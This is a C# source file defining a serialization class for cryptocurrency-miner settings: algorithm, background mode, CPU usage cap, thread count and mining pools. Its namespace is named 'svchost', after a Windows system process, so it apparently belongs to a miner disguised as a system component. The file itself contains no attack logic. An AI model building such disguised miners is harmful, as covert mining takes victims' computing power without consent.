using System.Collections.Generic;
using System.Runtime.Serialization;
using System.Web.Script.Serialization;

namespace svchost
{
	public class MinerConfig
	{
		[ScriptIgnore]
		public string Name { get; set; }

		[DataMember(Name = "av")]
		public short Av { get; set; }

		[DataMember(Name = "algo")]
		public string Algo { get; set; }

		[DataMember(Name = "background")]
		public bool Background { get; set; }

		[DataMember(Name = "colors")]
		public bool Colors { get; set; }

		[DataMember(Name = "cpu-affinity")]
		public bool CpuAffinity { get; set; }

		[DataMember(Name = "cpu-priority")]
		public bool CpuPriority { get; set; }

		[DataMember(Name = "max-cpu-usage")]
		public byte MaxCpuUsage { get; set; }

		[DataMember(Name = "retries")]
		public short Retries { get; set; }

		[DataMember(Name = "retry-pause")]
		public short RetryPause { get; set; }

		[DataMember(Name = "threads")]
		public short Threads { get; set; }

		[DataMember(Name = "pools")]
		public List<PoolConfig> Pools { get; set; }
	}
}